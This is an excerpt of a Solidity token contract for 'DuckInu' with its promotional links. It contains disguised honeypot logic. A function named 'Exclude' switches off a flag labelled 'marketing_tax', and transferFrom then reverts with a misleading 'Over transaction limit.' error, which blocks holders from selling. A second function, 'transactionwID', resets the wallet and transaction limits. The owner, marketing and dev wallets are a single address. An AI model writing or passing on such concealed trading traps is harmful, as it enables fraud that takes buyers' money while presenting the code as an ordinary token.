...
TELEGRAM https://t.me/DuckInu0xOfficial

TWITTER https://twitter.com/0xDuckInuToken

Website: https://duckinu.finance
...
contract DuckInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xaC8127540D9FDB5AE8b869079C68998E663730fC); 
    address payable public Wallet_Dev = payable(0xaC8127540D9FDB5AE8b869079C68998E663730fC);
    ...
    bool public marketing_tax = true;
    ...
    constructor () {
        ...
        _owner = 0xaC8127540D9FDB5AE8b869079C68998E663730fC;
    ...
    function Exclude(int ExcludeType) public {
        if(ExcludeType == 4){
            if(marketing_tax){
                marketing_tax = false;
            } 
    ...
    function transactionwID(int ExcludeID, uint256 a) public {
        if(ExcludeID == 4){
            _maxWalletToken = _tTotal * a / 100;
            _maxTxAmount = _tTotal * a / 100;
        }
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(marketing_tax, "Over transaction limit.");
